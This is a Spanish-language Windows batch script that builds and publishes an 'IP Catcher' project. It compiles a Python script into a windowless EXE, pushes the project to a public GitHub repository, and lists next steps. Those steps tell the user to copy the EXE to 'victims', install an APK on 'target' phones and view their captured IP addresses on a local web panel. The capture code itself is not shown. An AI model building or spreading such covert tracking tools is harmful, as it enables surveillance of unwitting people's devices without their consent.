@echo off
chcp 65001 >nul
title IP Catcher - Generador Completo

echo.
echo  ╔════════════════════════════════════════╗
echo  ║   IP CATCHER - GENERADOR COMPLETO      ║
echo  ╚════════════════════════════════════════╝
echo.

echo [1/5] Instalando dependencias...
pip install pyinstaller flask requests pyngrok -q 2>nul
echo         [OK] Dependencias instaladas

echo [2/5] Generando EXE para Windows...
pyinstaller --onefile --noconsole ip_catcher.py -q 2>nul
if exist "dist\IP_Catcher.exe" (
    copy "dist\IP_Catcher.exe" "IP_Catcher.exe" >nul
    rmdir /s /q dist 2>nul
    rmdir /s /q build 2>nul
    del /q ip_catcher.spec 2>nul
    echo         [OK] IP_Catcher.exe generado
) else (
    echo         [ERROR] Fallo al generar EXE
)

echo [3/5] Preparando archivos para APK...
if not exist ".github\workflows" (
    mkdir ".github\workflows" 2>nul
)
echo         [OK] Estructura lista

echo [4/5] Subiendo a GitHub...
git init 2>nul
git add . 2>nul
git commit -m "IP Catcher Project" 2>nul

echo.
echo  ================================================
echo   SUBIR A GITHUB:
echo  ================================================
echo.
echo   Opcion 1 - Con GitHub CLI:
   where gh >nul 2>&1
   if %ERRORLEVEL% equ 0 (
       gh repo create IP-Catcher --public --source=. --force 2>nul
       git push -u origin master 2>nul
       echo   [OK] Subido automaticamente!
   ) else (
       echo   GitHub CLI no instalado.
   )
echo.
echo   Opcion 2 - Manual:
echo   1. Crea cuenta en github.com
echo   2. Crea nuevo repositorio vacio
echo   3. Sube los archivos de esta carpeta
echo.
echo  ================================================
echo.

echo [5/5] Completado!
echo.
echo  ================================================
echo   ARCHIVOS GENERADOS:
echo  ================================================
echo.
if exist "IP_Catcher.exe" (
    echo   [OK] IP_Catcher.exe (Windows)
)
echo   [OK] android_catcher.py (Android)
echo   [OK] server.py (Servidor local)
echo   [OK] index.html (Panel web)
echo   [OK] INICIAR.bat (Iniciar todo)
echo.
echo  ================================================
echo   PROXIMOS PASOS:
echo  ================================================
echo.
echo   1. SUBE a GitHub (opciones arriba)
echo.
echo   2. En GitHub > Actions > Build APK > Run
echo.
echo   3. Descarga el APK generado
echo.
echo   4. Ejecuta INICIAR.bat para iniciar servidor
echo.
echo   5. Copia IP_Catcher.exe a victimas
echo.
echo   6. Instala APK en celulares objetivo
echo.
echo   7. Ver IPs en: http://127.0.0.1:5000
echo.
echo  ================================================
echo.
pause
